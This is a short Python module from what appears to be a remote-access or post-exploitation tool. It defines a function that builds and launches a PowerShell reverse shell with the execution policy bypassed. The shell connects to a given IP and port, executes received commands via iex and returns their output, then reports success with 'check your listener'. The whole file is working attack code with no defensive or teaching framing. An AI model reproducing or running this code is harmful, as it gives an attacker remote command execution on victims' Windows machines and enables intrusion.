from lib.setting import *


# spawn powershell session ####################################################################################
def spawn(target_ip, target_port):
    if os_type == 'windows':
        target_ip = socket.gethostbyname(target_ip)
        spawner = """powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('""" + str(
            target_ip) + """',""" + str(
            target_port) + """);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""""
        try:
            subprocess.Popen(spawner, shell=True)
            return "\n\033[1;32;32m[+]\x1b[0m powershell session spawned successfully, check your listener \033[1;32;32m[+]\n\x1b[0m"
        except:
            return "\n\033[1;32;31m[-]\x1b[0m failed to spawn powershell session \033[1;32;31m[-]\n\x1b[0m"
    else:
        return "\n\033[1;32;33m[!]\x1b[0m target is not a windows machine \033[1;32;33m[!]\n\x1b[0m"